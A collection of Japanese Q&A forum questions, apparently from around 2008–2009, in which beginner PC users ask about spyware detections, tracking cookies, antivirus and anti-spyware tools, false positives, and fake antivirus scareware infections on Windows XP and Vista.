はじめまして。教えて！で色々過去の質問を拝見しましたが、いまいち判らなくて困っています。PC初心者です。 ネットオークションをはじめまして、取引銀行に新生・イーバンクを使用しようと思い、今申請中ですが、今のＰＣ状態で使用していいのか判らなく困っています。心配としては個人情報漏れやスパイウェアやウィルスに感染しないようにしたいのです。 WindowsXPでNTT西日本フレッツ光プレミアム加入でCTU（ルーターというのですか？）もついており、過去の質問をみるとウィルス対策はこの時点で大丈夫という方と、やはりウィルスソフトを入れたほうがよいという方がいて、どうすればいいのか判らなくなっています。 できれば、初心者でも判り易い物で重くならない（以前、オンラインゲームをしようした時動かなくなったり、勝手にPCが切れてしまったり、クリックし、次の場面にいく際２分以上待ったりした事があります。） ソフトを入れたとしても１００％安全ではないと言っていらしたので、「そうなんだぁ」と納得はしましたが・・・。 ファイアーウォールも有効にしています。もちろんネットカフェなどで、自分の情報が入っているサイトは閲覧しません。 このPC５年以上も使用している為、1年に１回の割合で作動しなくなり初期化する憂き目にもあっています。その際、設定を最初からやり直ししていますが、これをしておけば、初期化した後も楽だよという案がございましたら是非教えてください。 できればPC用語に詳しくないので、素人にも判り易い用語でお願い致します。わがままですみません・・・。 宜しくお願いいたします。
ＫＩＮＧＳＯＦＴの脆弱性診断を行なった所、 下記が検出されました。 共有をキャンセルを選択して、共有を解消しても再起動すると再び共有脆弱性が検出されます。 共有場所：micorosoft xps document witer,localsponly (共有リソースでevereyoneに書込み権限が与えられています。） 共有場所：Cドライブのシステム32　spool￥drivers （システム中に共有リソースを発見しました。） しかし、ついこないだ今までセキュリティが甘い状態で使用していたため、スパイウェアに感染（トロイ）して健康状態が４になってしまいました。セーフモードで起動して、疑わしいファイルは全て手動で削除して、脆弱性を修正するプログラムを全てインストールして、ファイアーオォールの設定値も最高レベルに引き上げました。その結果、再起動してスキャンしてもウィルスは発見されなくなり、健康状態は100になりました。しかし、共有の脆弱性については解消していません。どなたか教えて下さい。
spypodを使っています。 先日スキャンすると、「win32.renos.ik」というスパイウェアが検出されました。 なので、いつものように駆除、修正をしようとしたら、「アクセスが拒否されました」と出て駆除ができませんでした。 これはいったいどうしたらいいのでしょうか？ また、win32.renos.ikはどれくらい危険なのでしょうか？ 今もＰＣの中に入ったまんまです。。。。
こんにちは。 なぜかMicrosoft,アンチウイルスソフトのあるサイトに接続 したら、「ページを表示できません」と出てしまいます。 いろいろ検索してhostsファイルを疑ってみたのですが なにも変更されていませんでした。 お願いします。 OSはWindowsXP Proです。
ウィルスバスター2007でスパイウェアの検索をしましたところ、 CrackinApps_Passwareというものが検出されました。 C:\Program Files\Passware\pk.chm です。詳細を見ようとしてもトレンドマイクロのページに情報がありません。 なので、ウィルスバスター2009の体験版に入れ直してチェックしたところ検出されませんでした。 pk.chmというファイルはヘルプのようで、問題はなさそうなんですが。。。 対策として対象ファイルを削除して、もう一度スパイウェアの検索をしました。 で、見つからなかったので問題なしだと思っているのですが、大丈夫でしょうか？ また、被害はあったのでしょか？ 以上です。教えていただきたいです。
セキュリティ対策ツールにてスパイウェア検索に Cookie_SpecificClick Cookie_Com Cookie_AddFreeStats が検出されました。で、スパイウェアについてやトラッキングクッキーについて調べてみていろいろと分かったのですが、新たに疑問が出てきたのでこちらで質問させていただきます。 I．Cookieを消去することのデメリットは興味ある広告を閲覧できなくなることくらいなのですか？ II．スパイウェア検索にて検出されたもののうち、上記のトラッキングクッキーのように頭に「Cookie_」とついているものは、９９％以上の確率でトラッキングクッキー（無害なもの）なのですか？ III．クッキーを残すことで、監視されること以外のデメリットにはどんなものがありますか？ お手数ですが、以上の３つの質問にお答えくださるとありがたいです。 よろしくお願いします。
一週間に一回の感覚でウイルスバスターで検索するのですが、検索すると必ずといっていいほど、cookie DoubleClickをはじめ、cookie～というスパイウエアがいくつか並びます。これは一体何のスパイウエアですか？
Malwarebytes' Anti-Malwareをインストールして検査しました。 ウイルス感染、スパイ感染に思い当たることは無かったのですが、結果に ログに2件 ---------------------------------------- Registry Data Items Infected: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_ShowHelp (Hijack.StartMenu) -> Bad: (0) Good: (1) -> No action taken. HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\StartMenuLogOff (Hijack.StartMenu) -> Bad: (1) Good: (0) -> No action taken. ----------------------------------------- 注意が出てました。 XP－SP3、ウイルスバスター、エフセキュア（オンライン）では何も見つかっていません。 レジストリのスタートメニューにハイジャックとなっていますが、どんな意味でしょうか？ 個人的には気にしなくてもいいような気がしてますが、念のため、よろしくお願いします。
こんにちは。 今、古い無線LANルータを使用しています。 バッファローのエアステーションWLAR-L11-Lです。 アクセスログを見ていて、知らないIPアドレスが載っていましたので、これはどういうことだろうとあれこれ調べましたが、わかりませんでした。 このように記載されています。 2009年3月4日 01時04分00秒 アドレス変換 60.254.154.74 --> 192.168.3.2 TCPポート:53744 FLAG:0x12 これは、60.254.154.74のアドレスの人が、ポート53744を通って入ってきた、ということなのでしょうか？ （パソコンにはウイルスバスターを入れていますので、もし侵入された場合でもファイアーウォールは効いていると思います。） 詳しい方にアドバイスいただければ幸いです。 よろしくお願いします。
spybot1.62を導入したのですが、パソコンを起動するたびに、自動的にフルスキャンがかかってしまい、困っています。 パソコンを起動すると、すべてのプログラムに先んじてspybotが起動し、フルスキャンが実行されるため、他のウィルスプログラムや 、インターネット回線が開くプログラムも立ち上がらないため、ひたすら処理が終わるのを待つ（1時間）しかない状態です。 さすがに、そんなに悠長に待てないので、現在はタスクマネージャ上から、spybotを強制終了させたり、他のプログラムを直接起動させたりして対応しています。 原因および対処方法が分かる人が居られましたら、教えてください。
初心者です。 クッキーがコンピューターに沢山溜っています。 出来れば、不要なものを消去したいのですが、何に使われているものか判断する方法を教えてください。
イーセットスマートセキュリティの体験版を試してみたいのですが、 体験するにはメールアドレスを入力しなくてはいけないのですが、何度試してもメールアドレスが入力できません。 以前はウイルスバスターを利用していましたが、期限がきれてしまい困ってます。出来れば無料の体験版で今月はすませたいのですが・・・。 初心者すぎる質問で申し訳ないですが、ご教授ください。
Torrentというソフトをダウンロードしようと思うのですが、このソフトはwinnyのような危険性はあるのでしょうか？ こんな単純な質問ですが、お答えいただければ幸いです
Googleツールバーでグーグル以外の（ブラウザから直接リンクを叩いた情報まで全ての）検索履歴が勝手に送られてしまって、とても気持ち悪いです。。これはプライベートの侵害です。 （使っていて気づかれていない方は気をつけてください） 「グーグルの検索窓から入力した時のみ」履歴を取得できるように出来れば良いのですが、出来ないように見えます。 法的に問題ない範囲の情報だと言っていますが、完全にプライベートの情報です。 結局私たちのアクセス履歴をマーケティングのネタにしようとしてますよね。。 金儲けの連中は喉から手が出る程欲しがるデータですね。 強制的に（使わなければ大丈夫ですが）情報を吸い上げて、直接アプローチしてくるんですよね。怖すぎます。
フリーのスパイウェア対策ソフトで有名な [SUPERAntiSpyware] [Spybot] [Ad-Aware] などがありますが、 どれが一番感知力が強いのでしょうか？ 教えてください。
　WinXp(HE SP2)です。先日、Ad-Aware AEで検索したところ、TAIが10の「Win32Tr/./NewMedia」というのが検出されました。推奨の処理をしました。ところで、この「Win32Tr/./NewMedia」というのが、どんなものなのか知りたいのです。スパイウェアの検索ソフトで検出したのですから、スパイウェアとは思いますが。 　「/」は、本当は逆スラッシュなのですが、どうやって書くか分からなかったので、とりあえず「/」で書いています。すみません。
先日、BIGLOBEのホームページからセキュリティセット・プレミアムを利用し始めました。その際、Windows Defenderについての表示が画面に出たのですが、よく分からずに適当にクリックしてしまいました。それ以降、パソコンの電源を入れて立ち上げる度に、『アプリケーションの初期化に失敗しました：0×800106ba問題が発生し、このプログラムのサービスが停止しました。サービスを開始するには、コンピューターを再起動するか、またはサービスを手動で開始する方法をヘルプとサポートで検索するかしてください。』との表示が出ます。いろいろやってみましたが、この同じ表示ばかりが出て、問題解決できません。このままで良いものかどうか、また、この表示を出なくするにはどうしたら良いか教えてください。
Ad-awareとSpywareBlasterを追加で先ほど導入したのですが、その後Spybotを起動すると以下の文章が出ました。 If you have the AdAware option to scan inside archives enabled, AdAware may find files in the Spybot-S&D folder. Spybot-S&D does not contain any spyware, but it creates backups of everything you fix (until you remove those backups from the Recovery list), and AdAware complains about these backups. You can safely ignore these backups found by AdAware. 確かAd-awareとSpybotは重複するとか注意に書いてあった気がしますが、毎回出るこの文章はIgnoreを選択していればいいでしょうか？
　Ad-Aware SE Personalをアンインストールしたいのですが出来ません。 　「Could not open INSTALL.LOG file」と出るのです。 　もう一度ダウンロードしてから消すというやり方があるようですが、もうすでに、Ad-Aware SE Personalはなく、Ad-Aware Free　Anniversary Editionっていうものに変わってしまっています。　　 　どうすれば、アンインストール出来るか教えてください。 　お願いします。
ウイルス・スパイウェアに関して質問があります。 ご存知の方もいると思いますが、昨日NHKでサイバーテロの特集が行われ、その時にbot対策としてサイバークリーンセンターが紹介されていました。私も少し不安になったため、さっそくCCCクリーナーでPC内をスキャンしました。結果、奇跡的（？）にウイルスは検出されず、感染はしていないようでした。 しかし、CCCクリーナー起動中、ウイルスセキュリティZEROの自動検知が起動し、Trojan-Spy.Win32.Banker.YZIなるものが連続的に４～５個検出されました。（検出場所はすべて同じ、ウイルスファイル？の名前はすべて異なるがそれぞれが似たような名前。この種のものは今回初めて検出。） しかも、あるものは「隔離」、あるものは「未処理」と、バラバラ。 不安になったので、下記URLにある、「トレンド　フレックス　セキュリティ」のオンラインスキャンを実行しました。 http://www.trendflexsecurity.jp/free_security_to … 4時間に及ぶスキャンの結果、ウイルス・セキュリティホール・トロイの木馬は無検知、スパイウェアに関しても「危険度低」のスパイウェア（ウイルスセキュリティによって検出されたものとは異なるもの）が一つだけ検出され、指示に従って削除しました。 しかし、そのオンラインスキャンの間にも、上記と同じスパイウェアがウイルスセキュリティによって2～3個検知され、これまた同じく「隔離」だったり「未処理」だったり。。。 これはウイルスセキュリティの誤検知なのでしょうか？ それとも、本物のスパイウェアなのでしょうか？（ちなみにBankerは「ネット銀行などを使用した際に、暗証番号が読み取られてしまう」ようなものらしいのですが、私はネット銀行やネットショッピングは利用しないので、あまり心配はしていないのですが、甘いですか？） いずれにせよ、オンラインスキャン中のみに連続して検知されることが引っ掛かります。何かアドバイスをお願いします。 ちなみに。。。 OSはWindouws Vista Home Premium Windows Updatehaは自動更新されていて、常に最新の状態です。 ウイルスセキュリティZEROも更新されています。 これ以外に何か必要な情報がございましたら、ご指摘ください。 長文失礼しました。よろしくお願いします。
adware optserve　アドウェアらしいですが一体なんでしょうか。
Ad-Aware.exeを起動すると下記のメッセージが表示されます このアプリケーションはサイドバイサイド構成が正しくないためアプリケーションを開始できませんでした。詳細についてはアプリケーションのイベントログを参照してください。 というメッセージがでて起動してくれません。 どうしたら起動させることができるのでしょうか？
あるサイトを表示したとき、スパイウェアやマルウェアなど悪意あるブツが含まれていた場合に警告を発するようなツールは無いでしょうか？ スパイウェアブラスターを使ってみたのですが、防御だけで、「いつ防御が発動したか」がわかりませんでした。 スパイウェアドクターは、いつ防御したかはわかるのですが、Ｗｅｂで評価を調べると最悪なので信憑性が無く、使えません。 （できる限り悪意があるやつだけ引っかかって欲しいです。） IE-SPYADはこれから試してみようと思いますが、目的の機能は無い気配・・・ 削除機能は無くてもよいです（スパイウェアドクターみたいに削除が有料でも、使わないので構わないです）。 何か、いいものはないでしょうか？
[不正侵入を防ぐ］から ［ファイアーウォールが実行されていません。ここをクリックして実行して下さい］をクリックしてみても無効のまま ［設定］からアプリケーション タブより全ての項目を［アクセスを完全に許可］へ変更しても無効のまま ファイアーウォールがかからない為、ネットが繋がらなくて非常に困っています（別のPCを使って書き込みをしています）。 どうしたら良いでしょうか？
教えてください。 スキャンすると、C:\WINDOWS\system32\msaud32_divx.acm が検出されました。 スパイウェアでしょうか？ プロパティでは、ACMファイルで、説明は、windows media audioです。 PLAYERは、WMP11、REAL11、GOM PLAYER、BEAT JAMです。
SpybotとAdーAwareFreeのリアルタイム保護は共存だきますか。
最近、インターネットを開くとYoog Searchというものが表示されていて、インターネットオプションの検索を見てみるとYoog Searchなるものがあって消しても消しても、出てきます。 そして、ＹＡＨＯＯで検索をするとなぜか左のほうが空白みたいな感じになったり、ＩＥを閉じようとするとエラーメッセッジがでたりと散々なことになってます。 いろいろなスパムウェアを行ったのですが、全然意味をなさなくて いろいろ調べてみたところ、アドインの管理であやしいものを無効にするとよいと記述されていたのですが、まったく意味がわからず途方にくれています。 どなたかわかる方いらっしゃいませんでしょうか？
カスペルスキーで完全スキャンしたら通知ウィンドウに 【ファイルC…/Tools/32bit/SICTOOL/SICBASE.DAT/SICBASE.PTNが含まれています。 パスワード保護されています。】 と出てきました。 レポート結果を見たりウイルス結果を見ても何も検知されていません。 これはこのままにしておいて大丈夫でしょうか？ 過去にスキャンした時も文が違う別の英文が同じような形で出たりしてました。 しかしその時もウイルス結果にはなにもなく、 プロテクションでもコンピュータは安全ですと出たままです。 私のパソコンスペックは Windows XP Home Edhishon SP3 CPU/インテルCore2DuoE8500 マザボ/インテルP45Express メモリーは4GB、 HDDは500GB、 です。 よろしくお願いします。
　下記2点の現象はスパイウェア、もしくはウィルスでしょうか？ (1)WORDの入力文字が勝手に消える (2)入力していないのに『47474747………』と入力される
自分は今ウィルスバスター2009を使っています。 昨日まではversionが2007だったんですけど、もうサポートされてないみたいで、アップグレードしました。 多分、良いセキュリティソフトだと期待しているのですが、１つだけ大きな問題があります。 それはウィルス検索をする際にCookieを全部削除してしまうんですよ。 これには物凄く困っています。 Cookieって問題かもしれませんが、便利じゃないですか。 自分は随分依存していますね。 他のセキュリティソフトで気になるのはノートンですかね。 NEOになりましたからね。以前使っていたんですが、その時は使い勝手が悪くてウィルスバスターに替えたんですけどね。 できれば、Cookieを無視かスルーしてくれるセキュリティソフトがいいですね。 ウィルスバスター2009も設定次第でそうなるかもしれませんが、随分イジってみたんですが、結果ダメでした。 ウィルス検索は週1回にしてるので、毎週Cokkieが削除されると思うとたまりません。 こんな自分に何かアドバイスはあるのでしょうか。 どうぞ宜しくお願い致します。
Dドライブに無料版のキングソフトインターネットセキュリティをダウンロードしたのですが、そこからインストールしようとすると 「NTプラットフォームでこのインストールプログラムを対応できませんのでhttp:/www.kingsoft.jp/download/からNTプラットフォームを対応するパッケージをダウンロードしてインストールしてください。～」 と出ます。 「はい」をクリックすると、キングソフトのダウンロードページに飛びますが、そのページのどこでどうしたらいいのかわかりません。 どうぞ教えていただけますようお願い致します。 使用パソコンはウィンドウズXPです。 PS.会社のパソコンで、１０数台のパソコンをLANケーブルでつないでインターネットを使用しております。 そのような環境でもインストールには支障がないのでしょうか？？？
先程カスペルスキーで完全スキャンしてる最中に、 右下に白い窓と一緒に文字が一瞬出てきました。 少しの間出てただけなのでメモを取れなかったのですが、 C:Tool←この後に英語がなんとか～かんとか～とまだありました。 そしてそれと共に、【パスワードがかけられています。】だか 【パスワードがかかっています。】 と記述されてました。 しかし完全スキャンの結果は何もなく、脆弱性やウイルスも検知されてません。 パスワードがかけられてるとありましたので、 これはもしかして何かのスパイウエア？か 巧妙なウイルスなのでは？と心配になってるのですが、 わかる方がいらっしゃいましたら対処の仕方等教えていただけると助かります… 私のパソコンスペックは Windows XP Home Edhishon SP3 CPU/インテルCore2DuoE8500 マザボ/インテルP45Express メモリーは4GB、 HDDは500GB、 です。
　今晩は。 　Ad-Awareについて教えて下さい。 　色々と調べてみると、Ad-AwareにはAd-AwareとAd-Aware SEの両方があることが分りました。 　これはやはりAd-Aware SEの方が新しいのでしょうか。 　Ad-Aware SEの意味は、Second Editionという意味でしょうか。 　また、インストールするにはどちらが良いのでしょうか。
タイトルの通りです。 過去の質問を検索してみて、ウイルスバスター単体じゃスパイウェア対策がなってないだとか、スパイウェアソフトを入れると競合してしまうだとか、どっちが本当なのかわかりません。 ずばり、ウイルスバスター2009の入っているパソコンに別途でスパイウェアソフトは必要ですか？必要ではないですか？ 必要な場合、どのソフトなら競合せずに使用できますか？ よろしくお願いいたします。
「Ad-Aware Free Anniversary Edition」をインストールしました。 一度スキャンした後、検出結果をクリアにしようと実行ボタンを押したら、 勝手に「Threstworks」という窓が開きました。 情報を送信する、のボタンを押さないと終了出来なかったので送信したのですが、 「今後の参考にします…」みたいな事が書いてあり、送信後は「ご協力有難う御座いました」 と出ました。 後になって設定の中に「Threstworks」という項目があって、 ファイルを自動的に送信する、しない、ウィンドウを開く…とあるのに気付きました。 何となく怖くなって、今は「送信しない」にチェックを入れています。 最初にスキャンした結果が送信されてしまいましたが（多分LAVASOFTに）、 大丈夫なんでしょうか。不安です。
Comodo Firewall Pro V3.5を使用しています。ConfigurationをProactive Securityにしておけば「窮極の保護」が得られる、というようなことがヘルプファイルに書いてあるので、そうしていますが、アラートの頻発に閉口しています。 そこで、安全性に大きな違いがなければConfigurationをOptimum Securityに変えたいと思うのですが、次のような疑問があります。 ネットで調べたところ、V3以後、Optimum Securityの選択肢は本来はなく、旧バージョンに上書きインストールした場合にのみ残るようです。しかし、旧バージョン用のOptimum Security ConfigurationがV3.5でも機能するのでしょうか。タスクトレイのComodoアイコンをクリックすると、一応選択はできるようになっていますが。 Optimum Securityに関してはヘルプファイルに記載がなく、ネットでも関連情報が見つからず、判断に迷っています。ご存じの方のご教示をいただけると助かります。
カスペルスキーインターネットセキュリティを使用しています。 先月パソコンを購入してから今までに何度か完全スキャンしましたが、 C:ProgramFilesAdobePhotoShopElements5.0Plug-InsFileFormatsBMP.8BI というオブジェクトの脆弱性がつねに検知されるのでどうしたらいいかと思うようになりました。 このままほっといて大丈夫でしょうか？ 以前質問した時、Adobeサイト行ってFlushPlayerの更新してみて下さいと言われやってみましたが、 失敗続きで何度やっても更新出来ませんでした。 因みにペンタブに付いていた AdobeのPhotoShop Elements5.0を使用してます。 私のパソコンスペックは Windows XP Home Edhishon SP3 CPU/インテルCore2DuoE8500 マザボ/インテルP45Express メモリ4GB、 HDDは500GB、 グラボ/GeF9500GT です。 よろしくお願いします。
セキュリティの面を考えるとログイン名（アカウント）もすこしひねったものにした方がよいのでしょうか？ それとも，ログイン名はすぐにわかってしまうものなのでしょうか？ よろしくお願いします。
ウィルスバスター２００９でウィルス検索をすると毎回（毎朝１回してます）１００程度のADWARE_MEMWATCHERというスパイウェア（アドウェア）が見つかります。 隔離して削除を毎回しているのですが毎回見つかります。 なぜでしょうか？ 対応策などご教授よろしくお願いします。
ウイルスバスター2008の無線LANパトロールを使っているのですが、パソコンを使う度に不正接続されているコンピュータのIPアドレスが複数表示されます。 表示されるIPアドレスの数はその時々によって違いますが、どれもよく似ています。 IPアドレスを調べた結果、それらは海外のコンピュータだと分かったのですが、それらのコンピュータが危害を加えるものなのかよく分かりません。 それらが危害を加えるコンピュータであるのかどうかはどのように判断すれば良いのでしょうか？ また、危害を加えるものであった場合、どのように処理すれば良いのでしょうか？ 教えてください。
私は3日に一度くらいは、ウィルス検索にかけているのですが、検索をかける度にに毎回１０～３０個くらいのスパイウェアが発見されてしまいます。その都度、削除しており、目に見える実害は無いのですが、非常に心配です。 このようなことについては、私は全く知識がありません。いったい何が原因で、どうすれば解消されるのでしょうか？このまま放っておいても大丈夫なのでしょうか？ ちなみにウイルス検索ソフトは、ＮＴＴフレッツサービスのもの（ウイルスバスター？）を使用しています。
なんか、とんでもないスパイウェアかトロイに感染したかもしれません。 Cドライブをクリックしたら、以下のメッセージが出ました。 --------------------------- RECYCLER\S-7-8-90-100020655-100024379-100022220-3327.com --------------------------- 'RECYCLER\S-7-8-90-100020655-100024379-100022220-3327.com' が見つかりません。名前を正しく入力したかどうかを確認してから、やり直してください。ファイルを検索するには、 [スタート] ボタンをクリックしてから、[検索] をクリックしてください。 --------------------------- OK --------------------------- このすぐあとに、Symantec AntivirusからPacked.Generic.200に感染したので 検疫したとメッセージが出ます。 その後、Cドライブは同様のメッセージが出て開けなくなり、エクスプローラで しか確認できません。 感染したのは多分、ハードから異音がし始めた一昨日ぐらいだと思います。 ハードの回転数が定期的に上がり、「ガガ」という音がします。 感染したあと、Symantec Antivirusの完全スキャンも実行し、Packed.Generic.200 の検疫駆除もできました。ただ、ここからがこのスパイウェア（ウイルスかな？）の 恐ろしいところで、他の外付HDDドライブをクリックするとまた復活して、感染しよう とします。 そして同様に他のHDDもクリックすると開けない状態になってしまいます。 現在は、ハードの異音も止まり静かな状態です。 ただ、他のHDDも感染しそうになるのが怖くて中が見れません。 多分、ここ最近出てきたばかりのまだ何も対処策が出ていない未知の ウイルスだと思いますが、対処策をご存知の方は教えていただけません でしょうか。とても困っております。
WinRAR3.00をインストールする前にウイルスチェックを実行した ところ　Trojan-Spy.Win32.Banker.YZI　が発見されました。 チェックしたウイルスソフトは　ウイルスセキュリティＺＥＲＯ　です。 念のためインストールは中止してます。 いろいろ調べてみると他の方も同じ体験をしているようで、どうも ウイルスセキュリティＺＥＲＯが誤検知しているとのこと。 この噂話が本当かどうか知りたいです。 問題なければソフトをインストールしたいと思っております。 アドバイスよろしくお願いいたします。
つい先日にノートパソコンを購入したばっかなのですが、その中に元々入っていたスパイスウィーパーを使用してみました。 そして、完全スキャンをした結果doubleclick cookieとoverture cookieというのが検出されました。 まだ、買って数日しかたっておらず見たサイトもYahoo!やmixiくらいなのにウイルスが検出されることってあるんですか？ パソコンにあまり詳しくないのでお願いします。OSはvistaです
タイトルの他に右上に半透明のQQの矢印マーク、左下タスクトレイ中にも同じマーク。 また、右クリックした時最新の情報に更新(R)の次に文字化けした謎の項目。 これらの完全なアンインストール方法を教えてください。 一度アンインストールしたのでないはずなのですがあります。 ファイルはもう見当らず強制削除できません。 有効な回答がなければリカバリするつもりです。 ㊟画像はQQdownloaderです、何かソフトをインスコする時にDLマネージャーとしてでてきます。
どうか助言をいただけないでしょうか。 windowsXP、IE7を使っています。 メールはyahoo!メール（無料のもの）です。 yahoo!メールアドレスに、台湾人を名乗る人物から ファイル添付のみで本文がないメールが届きました。 この人物と私は何度かデータをやり取りしていたので、それかと思いました。 添付ファイルをクリックすると、まずyahoo!メールによるウィルスチェックが行われるのですが、 このチェックでは問題がありませんでした。 なので安心して開こうとすると、windowsかIEからかはわかりませんが、 このファイルはfile transfer programであるという警告（赤い印象があります）がでました。 他にも数行、何かが書いてあったので、確認しようとしている数秒の間に この警告は消えてしまい、 他のインターネットサイト？（アダルト画像？）がポップアップしてきました。 すぐにポップアップは閉じましたが、今パニック状態です。 無防備すぎたと大変反省しています。 パソコンの中にはとても大事な情報が入っています。 yahoo!メールのチェックに通ったとしても、この過程において、 スパイウェアに感染してしまっている可能性は高いでしょうか。 もう情報は流出してしまったと考えるべきでしょうか。 今のところ行ったことは、素人考えですが、 「スタートメニュー」の「検索」で このメールを開いた前後１時間に作成されたファイルという条件で検索をかけ、 出てきたファイルを全て削除し、 そのあと、ウィルスチェック（windows live のプロテクトスキャンです） を行いましたが、こちらでは問題は出てきませんでした。 今、とても混乱しています。乱文で申し訳ありません。 追加の情報が必要でしたらすぐに書き込みます。 どうか助言をお願いいたします。
　Norton Internet Securityでスキャンしたら、セキュリティ・リスクとして、1件が報告されました。その中に８３件ものレジストリー項目がありました。中には沢山の英数字が並んだ項目もふくまれています。 　「regedit」で検索しても「ヤフオク」や「オプトメディア版」は１項目もありません。また、このようなソフトを入れた記憶もありません。これは、スパイでしょうか、ウィルスでしょうか。それともNorton Internet Securityの誤認識でしょうか。 　ご存じの方、お願いします。
「AntiVirus 380」と言う悪質なスパイウェアーに感染してしまいました。症状としては、PCを立ち上げるとこの「AntiVirus 380」の駆除画面が立ち上がり、インターネット画面も直ぐにブロックされて使えなくなります。これを駆除する為にクレジットカードでオンライン購入するように要求するものです。PCサポート業者に相談したところこれは一種の振込め詐欺を目的としたもので、例えお金を振込んでも改善される保証は無く金銭搾取を目的とする非常に悪質なマルウェアーとのことでした。結果的には駆除できましたが、何かフリーウェアーのソフトでこのような感染に対処出来ないものか或いは注意する事柄等についてアドバイス頂く様お願いします。
ウイルスのセキュリティは導入してあるのですが、本日フリーのスパイウェアーをダウンロードしました。 ちゃんとダウンロードできているか調べるにはどうすればよいですか？ もしできていなければもう一度チャレンジしなくてはならないのですがうまくダウンロードする方法も教えてください。 よろしくお願いします。
FireFoxでネットをしています。セキュリティソフトはウイルスバスター2009でキーロガーがFireFoxに対応していません。 この状態で個人情報等を打ち込むのは危険でしょうか？ ショッピングサイトやネット銀行やオンラインゲームのアカウント作成等にクレジットカード情報や住所や名前等を登録するのは危険ですか？ フリーソフトでFireFoxに対応していてウイルスバスター2009と同時に起動しても問題ないオススメソフトはありますか？
ＰＣが、critical なウイルス、スパイウエアに感染しました。 ＰＣを修復させるのにやるべきことを教えてください。 ウイルスバスターに入っていたのですが、なぜか、登録の更新がされておらず、最新のウイルスを隔離できなかったようです。
先日、英語で「あなたのパソコンが危険にさらされています、また、個人情報が勝手に送信されようとしています。」 とのダイヤログが表示されました。 SPYBOTで検索したところ、以下のような結果が表示されました、これは全て削除しても良いのでしょうか。 以前、全て削除にしてPCの調子が変になったこともあります。 表示された結果の内容が良くわかりません。 これらの内容が分かるようなサイトはあるのでしょうか。
ウイルスバスター２００８体験版で無線ＬＡＮパトロールで検出した他の機器に「例外ルールを追加する」のボタンを押したのですが、パトロールの度に同じＩＰアドレスの機器が検出されてしまいます。どうしたら接続を止めさせる事ができますか？ パソコンを買ったばかりでとても不安です。どうぞよろしくお願いします。
Googleで検索を行うと検索結果すべてに“このサイトはコンピュータに損害を与える可能性があります。”と表示されてしまうようになりました。Google検索で“Ｇoogle”を検索しても同様です。この状況を回避させる方法をご存知の方がいらっしゃれば、ご示唆いただけると幸いです。
最近気がついたのですがインターネットの履歴にマイコンピュターがある？これは普通ですか？らしいのですがワードまででます。 気持ち悪い！インターネットにのるなんて同じ思いの方、また対策方法お知りの方なんせ初心者なのでよくわかりません、どうぞよろしくお願いします
スパイウェアに感染しているのでしょうか？ Ad-Awareでスキャンしてみたら、 フアミリ Suspicious Object オブジェクト file 数量１ ＴＡＩ １ ファイル C:＼WINDOWS＼Downloaded＼_＼m.Files＼rc40＼psapi.dll と出てます、これはスパイウェアですか？ あと revsci*statse.webtrends*webtrendslive*statse.webtrendslive overture*2o7*doubleclick*advertising*advertis ↑のクッキーは削除しても問題ないのでしょうか？
最近広告が勝手に表示されるようになったのでスパイウェアが入ってきたと思いウイルスバスターでスキャンしたんです 検出されたものは全て削除したのですがまだ表示されるのでSpyBotを使おうとSpyBotのHPにアクセスしたところページがありませんと出てきたんです。 混んでるのかな？と思ったのですがほかのPCからアクセスすると普通に開くのでそのPCからインストーラーをDownloadしインストールを行おうとしたんです。 でもインストーラーがサイトにアクセスし更新のDownloadをおこなうようでインストールができないんです（SpyBotのHPへアクセスできないため更新もDownloadできないみたいです・・・） 仕方なくAd-Awareというソフトでスキャンしてみたんですが・・・いまいちなんです。 症状は ネットを見てると時々広告が開く ネットのリンクを開くと行き先がgoogleになってたりする ネットを見てないときは広告は出ない SpyBotのHPへアクセスできない 何のスパイウェアかわかるかたいましたらアドバイスよろしくお願いします。
ＯＳはビスタで、ブラウザはＦｉｒｅｆｏｘ３です それで関係無いかも知れませんが ウィルス用ソフトはESET Smart Securityです それでスパイ用ソフトとしては 現在「Spybot - Search & Destroy 1.6.0.30」 「Ad-Aware 2008 Free v7.1.0.11」 「SUPERAntiSpyware」 の３つを入れてますが Ad-Awareで[アドウェア]がヒットしたのと Ad-AwareとのSUPERAntiSpyware検索結果を、どう判断するかという質問です ただ、誤解の無い様に書かせて頂きますが スパイソフトを３つ入れてる理由は これだけ入れてれば、スパイに対する セキュリティが大丈夫と考えてる訳じゃありません これは、私自身が使い心地と勉強の為、一時的に入れてます この理由は、私のパソコン使用は、ネット接続がメインで このミクシィや他のＨＰ等での交流の他 変な話ですが、複数の無料アダルトＨＰから 頻繁に動画をＤＬ、気に入った作品を保存してるのと 以前ＭＥを使用してたんですが セキュリティ面でのサポートの関係で ブラウザをＩＥ６からＦｉｒｅｆｏｘ２へ ウィルスソフトをＮＯＤ３２(ＦＷはフリーソフト) でしたが、その時 SpybotとAd-Awareで週１回、通常＆セーフで… ＮＯＤ３２で隔週、手動検索してました ただ、ＭＥの時代には 幸か不幸か、いつもクッキーしかヒットせず １回だけアドウェアがSpybotでヒットしましたが その時には、その前に 変なポップアップの広告が出た為、分かりました しかし、今はビスタに変えましたから ここ迄、神経を使う事も無いとは思いますが スパイソフトは勉強の為と入れてます 従って、ある程度内容が分かったら １～２個で使用する予定です それで今回、Ad-Awareで、アドウェアがヒットしました ただ、Spybotではヒットせず Ad-Awareではアドウェア表示 しかし、SUPERAntiSpywareではアドウェアですがクッキー表示でしたし ファイルの場所も違ってる為、同一ファイルでは無いと思います しかも、以前の様なポップアップは一切出てません 但し、出てないからと言っても それで安心出来るとは思ってませんが… それが今回アップ画像なんですが ここでは一枚しか投稿出来ない為 合成させて頂きました 最終的には私が判断する事だと思います ただ、このアドウェア、皆さんなら、どう判断しますか？ そして、もう１つ ＭＥ時代に使用してたAd-Awareでは 駆除の対象が色分けでした 従って、赤の表示の時だけ、クッキーでも削除してましたが 現在は、色ではなく数字です ですから、駆除するか、どうかも判断し難いんですし SUPERAntiSpywareでは尚更、どう判断すれば良いかが分かり難いです 皆さんなら、どう判断しますか？ ちなみに、検索で調べましたが分かりませんでした
MS Anti****というものが侵入ししつこくこれを買えと言ってきます。 WIN XPのPCですが、システムの修復や、ネットでセキュリティソフトを頼もうとすると妨害されて進みません。 どうしたら良いでしょうか。
